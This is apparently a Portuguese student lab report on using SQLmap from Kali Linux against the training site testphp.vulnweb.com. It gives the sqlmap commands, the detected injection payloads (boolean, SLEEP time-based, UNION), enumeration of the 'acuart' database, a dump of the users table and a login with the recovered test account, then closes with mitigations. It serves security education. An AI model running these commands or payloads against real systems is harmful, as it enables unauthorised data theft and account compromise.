# Atividade 6.10 — Explorando SQL Injection no Kali Linux com SQLmap

## Objetivo

Nesta atividade foi utilizado o **SQLmap** no Kali Linux para analisar uma aplicação web disponibilizada especificamente para testes de segurança e demonstrar o funcionamento de uma vulnerabilidade de **SQL Injection**.

A partir de um parâmetro GET da aplicação, foram identificados:

* o SGBD utilizado;
* as técnicas de SQL Injection aceitas pelo parâmetro;
* os bancos de dados disponíveis;
* as tabelas do banco `acuart`;
* as colunas das tabelas;
* dados de uma coluna da tabela `users`;
* e, no laboratório, uma credencial de teste que permitiu autenticação na própria aplicação vulnerável.

> A atividade foi realizada contra o ambiente de treinamento `testphp.vulnweb.com`, disponibilizado para testes de segurança. As credenciais utilizadas para acesso ao laboratório não são registradas neste documento.

---

## Ambiente

* **Sistema:** Kali Linux
* **Acesso:** RDP
* **IP:** `192.168.98.40`
* **Usuário:** `aluno`
* **Ferramenta:** SQLmap
* **Alvo de laboratório:** `http://testphp.vulnweb.com`
* **Parâmetro analisado:** `artist`

---

## 1. Identificando a aplicação de teste

No Firefox foi realizada uma pesquisa para localizar uma página do ambiente de treinamento que utilizasse um parâmetro `id`:

```text id="m4z8p2"
site:http://testphp.vulnweb.com/ php?id=
```

O primeiro resultado direcionou para:

```text id="q7x3n5"
http://testphp.vulnweb.com
```

No site foi acessada a opção **Browse artists** e, em seguida, o primeiro artista identificado como `r4w8173`.

A página aberta possuía a seguinte estrutura:

```text id="k2v6r9"
http://testphp.vulnweb.com/artists.php?artist=1
```

O parâmetro:

```text id="c5j8w3"
artist=1
```

seria utilizado pelo SQLmap para verificar a possibilidade de SQL Injection.

---

## 2. Obtendo privilégios administrativos no Kali Linux

No terminal foi utilizado:

```bash id="p9r4x7"
sudo -i
```

A senha utilizada para o laboratório foi omitida deste documento.

---

## 3. Identificando os bancos de dados com SQLmap

O primeiro teste utilizou o parâmetro `artist` para identificar possíveis pontos de injeção e listar os bancos de dados:

```bash id="u3k7m1"
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 –dbs
```

O SQLmap iniciou os testes contra o parâmetro GET `artist`.

Entre as informações identificadas estavam:

```text id="a8q2v6"
[INFO] testing if GET parameter 'artist' is dynamic
[INFO] GET parameter 'artist' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')
```

O SQLmap identificou o backend como MySQL e prosseguiu com diferentes técnicas de SQL Injection.

### Técnicas testadas

Durante a análise foram realizados testes de:

* Boolean-based Blind;
* Error-based;
* Parameter Replace;
* Stacked Queries;
* Time-based Blind;
* UNION Query.

O SQLmap identificou que o parâmetro `artist` era vulnerável.

Parte relevante do resultado:

```text id="f6w3j9"
Parameter: artist (GET)
   Type: boolean-based blind
   Title: AND boolean-based blind - WHERE or HAVING clause
   Payload: artist=1 AND 5066=5066

   Type: time-based blind
   Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
   Payload: artist=1 AND (SELECT 6951 FROM (SELECT(SLEEP(5)))OcNh)

   Type: UNION query
   Title: Generic UNION query (NULL) - 1 to 20 columns
   Payload: artist=-9154 UNION ALL SELECT CONCAT(0x7162767a71,0x614d4c77757359426e45586b645243546a4e486c6161786b455549636c4a7649707a6e506261596d,0x716b787171),NULL,NULL-- -
```

O SQLmap também identificou:

```text id="r5m8c2"
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.0.12
```

### Bancos encontrados

O resultado foi:

```text id="t7x4p9"
available databases [2]:
[*] acuart
[*] information_schema
```

Portanto, o SQLmap conseguiu enumerar dois bancos de dados:

* `acuart`;
* `information_schema`.

---

## 4. Enumerando as tabelas do banco `acuart`

Com o banco identificado, foi executado:

```bash id="n6q2v8"
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables
```

O SQLmap retornou:

```text id="w3m9k5"
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+
```

Foram identificadas oito tabelas:

```text id="y8c4r1"
artists
carts
categ
featured
guestbook
pictures
products
users
```

A tabela `users` chamou atenção por representar uma possível área sensível da aplicação.

---

## 5. Enumerando as colunas

Para obter a estrutura das tabelas do banco `acuart`, foi utilizado:

```bash id="g2p7x5"
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –columns
```

O SQLmap identificou as seguintes estruturas.

### Tabela `artists`

```text id="s9m4q2"
Database: acuart
Table: artists
[3 columns]
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| adesc     | text        |
| aname     | varchar(50) |
| artist_id | int         |
+-----------+-------------+
```

### Tabela `featured`

```text id="k6v3p8"
Database: acuart
Table: featured
[2 columns]
+--------------+------+
| Column       | Type |
+--------------+------+
| feature_text | text |
| pic_id       | int  |
+--------------+------+
```

### Tabela `categ`

```text id="r4x8n1"
Database: acuart
Table: categ
[3 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| cat_id | int         |
| cdesc  | tinytext    |
| cname  | varchar(50) |
+--------+-------------+
```

### Tabela `pictures`

```text id="v7m2c9"
Database: acuart
Table: pictures
[8 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| a_id   | int          |
| cat_id | int          |
| img    | varchar(50)  |
| pic_id | int          |
| plong  | text         |
| price  | int          |
| pshort | mediumtext   |
| title  | varchar(100) |
+--------+--------------+
```

### Tabela `guestbook`

```text id="p5q9w3"
Database: acuart
Table: guestbook
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| mesaj    | text         |
| sender   | varchar(150) |
| senttime | int          |
+----------+--------------+
```

### Tabela `carts`

```text id="j8x4m6"
Database: acuart
Table: carts
[3 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| cart_id | varchar(100) |
| item    | int          |
| price   | int          |
+---------+--------------+
```

### Tabela `products`

```text id="b3r7k2"
Database: acuart
Table: products
[5 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| description | text         |
| name        | text         |
| id          | int unsigned |
| price       | int unsigned |
| rewritename  | text         |
+-------------+--------------+
```

### Tabela `users`

```text id="h6n2v9"
Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| name    | varchar(100) |
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+
```

A tabela `users` possui campos relacionados a autenticação e dados pessoais, como:

```text id="x5q8m4"
uname
pass
email
phone
address
```

Também foi identificado o campo `cc`, relacionado a informações de cartão.

Em uma aplicação real, a exposição desses dados por meio de SQL Injection representaria um risco significativo.

---

## 6. Obtendo dados da tabela `users`

Com a estrutura da tabela conhecida, foi realizado um teste direcionado à coluna `uname`:

```bash id="q4v8p6"
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
```

O resultado apresentou uma entrada:

```text id="m7c3x9"
Database: acuart
Table: users
[1 entry]
+-------+
| uname |
+-------+
| test  |
+-------+
```

O SQLmap informou ainda que os dados foram registrados localmente em:

```text id="w2n6r4"
/root/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv
```

O valor encontrado corresponde a uma conta de teste do ambiente vulnerável.

---

## 7. Obtendo o campo de senha do laboratório

Em seguida, foi executado:

```bash id="f8k2m5"
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass –dump
```

O SQLmap retornou uma entrada para a coluna `pass`.

Por se tratar de uma credencial de autenticação, o valor não é reproduzido neste README.

O resultado confirmou que o ambiente de treinamento armazenava a credencial da conta de teste de forma diretamente recuperável.

---

## 8. Testando a autenticação

Com os dados recuperados nos passos anteriores, foi acessada novamente a página:

```text id="c6x9p3"
http://testphp.vulnweb.com/artists.php?artist=1
```

Na aplicação foi selecionada a opção **Signup**, localizada na coluna esquerda.

Foram inseridas as credenciais de teste obtidas durante a enumeração e realizada a tentativa de autenticação.

O login foi aceito pelo ambiente de treinamento, demonstrando o impacto que uma SQL Injection pode ter quando permite acesso a informações armazenadas no banco de dados.

**Este é o passo solicitado para a evidência da atividade.**

---

## Técnicas de SQL Injection observadas

### Boolean-based Blind

O SQLmap identificou uma técnica baseada em condições booleanas.

Exemplo identificado:

```text id="d9m4q7"
artist=1 AND 5066=5066
```

A técnica permite inferir informações observando diferenças no comportamento das respostas da aplicação quando condições verdadeiras ou falsas são utilizadas.

### Time-based Blind

Também foi identificada uma técnica baseada em tempo:

```text id="k5v8x2"
artist=1 AND (SELECT 6951 FROM (SELECT(SLEEP(5)))OcNh)
```

Nesse tipo de teste, atrasos controlados na resposta podem ser utilizados para inferir se uma condição foi processada pelo banco de dados.

### UNION Query

O SQLmap identificou uma técnica baseada em `UNION`, com três colunas:

```text id="p3n7c5"
Generic UNION query (NULL) - 3 columns
```

Esse tipo de técnica pode permitir combinar resultados de consultas quando a aplicação é vulnerável.

### Error-based

Também foram realizados testes que exploram respostas de erro do SGBD para obter informações sobre o processamento da consulta.

### Stacked Queries

O SQLmap verificou a possibilidade de execução de consultas empilhadas, nas quais múltiplas instruções SQL podem ser processadas em determinadas condições.

---

## O que foi identificado

O processo de enumeração demonstrou uma sequência típica de análise de uma SQL Injection:

```text
Parâmetro GET
     ↓
Detecção de SQL Injection
     ↓
Identificação do SGBD
     ↓
Enumeração de databases
     ↓
Enumeração de tabelas
     ↓
Enumeração de colunas
     ↓
Extração de dados
     ↓
Teste de impacto na aplicação
```

Neste laboratório, o parâmetro:

```text id="z4q8m1"
artist
```

foi identificado como vulnerável.

O backend foi identificado como **MySQL**, e o banco `acuart` apresentou uma tabela `users` contendo campos relacionados à autenticação.

---

## Conceitos de segurança

### SQL Injection

SQL Injection ocorre quando dados controlados pelo usuário são incorporados de maneira insegura a consultas SQL.

Quando não existem mecanismos adequados de validação e parametrização, um atacante pode manipular a consulta original e fazer com que o banco execute operações não previstas pela aplicação.

### Impacto

Uma vulnerabilidade desse tipo pode permitir, dependendo do contexto:

* descoberta da estrutura do banco;
* leitura de informações;
* alteração de dados;
* acesso a informações de autenticação;
* comprometimento de contas;
* e, em determinados cenários, impactos adicionais sobre a aplicação ou infraestrutura.

### Medidas de mitigação

Entre as principais medidas defensivas estão:

* utilizar **prepared statements / consultas parametrizadas**;
* evitar concatenar entrada do usuário diretamente em consultas SQL;
* aplicar validação de entrada;
* utilizar contas de banco de dados com o menor privilégio necessário;
* proteger informações sensíveis armazenadas;
* armazenar senhas utilizando algoritmos modernos de hash apropriados;
* monitorar tentativas anômalas de acesso à aplicação;
* realizar testes de segurança periodicamente.

---

## Resultado

A atividade demonstrou, em um ambiente criado para testes, como o SQLmap pode automatizar a identificação e exploração controlada de uma SQL Injection.

O parâmetro `artist` foi identificado como vulnerável e o SQLmap conseguiu:

1. detectar a possibilidade de SQL Injection;
2. identificar o MySQL como backend;
3. identificar o banco `acuart`;
4. enumerar oito tabelas;
5. enumerar as colunas dessas tabelas;
6. identificar a tabela `users`;
7. recuperar dados de uma conta de teste;
8. demonstrar o impacto da vulnerabilidade por meio da autenticação no ambiente de treinamento.

---

## Evidência

A evidência desta atividade corresponde ao **passo 11**, no qual as credenciais de teste recuperadas durante a atividade foram utilizadas para realizar a autenticação no ambiente vulnerável.

[**Evidências — Módulo 6 / Aulas 3 e 4**](../evidencias.pdf)

